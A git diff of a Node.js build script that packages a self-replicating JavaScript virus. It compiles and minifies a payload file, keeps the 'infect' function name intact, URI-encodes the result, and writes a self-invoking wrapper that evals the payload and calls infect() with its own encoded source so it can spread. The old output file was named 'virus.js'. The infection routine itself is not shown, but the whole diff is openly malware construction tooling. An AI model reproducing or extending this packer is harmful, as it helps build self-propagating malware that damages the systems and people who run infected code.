@@ -1,20 +1,25 @@
-const fs      = require( "fs-extra" );
-const babel   = require( "babel-core" );
-const winston = require( "winston" );
-const ugly    = require( "uglify-js" );
+const fs   = require( "fs-extra" );
+const exec = require( "child-process-promise" ).exec;
+
 
 async function build() {
-    var src = await fs.readFile( "payload.js", "utf8" );
-    var compiled = babel.transform( src, { presets : require.resolve( "babel-preset-es2015" ) } ).code;
-    var minified = ugly.minify( compiled, { mangle : { reserved : [ "infect" ] } } );
-    var payload = encodeURI(minified.code);
 
-    await fs.writeFile( "virus.js", `(function() {
-        ${decodeURI(payload)} 
-        infect( "${payload}" );
+    var src = "payload.js";
+    var compiled = ".build/payload.compiled.js";
+    var minified = ".build/payload.min.js";
+        
+    var tgt = "payload.built.js";
+
+    await fs.ensureDir( ".build" );
+    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
+    await exec( `./node_modules/.bin/uglifyjs --compress -o ${minified} ${compiled}` );
+
+    var raw = await fs.readFile( minified, "utf-8" );
+    await fs.writeFile( tgt, `(function() {
+        var payload = "${encodeURI(raw)}";
+        eval( decodeURI(payload) );
+        infect(payload);
     })();` );
 }
 
-build()
-    .then( () => winston.info( "BUILD SUCCEEDED" ) )
-    .catch( e => winston.info( "BUILD FAILED", e ) );
+build();
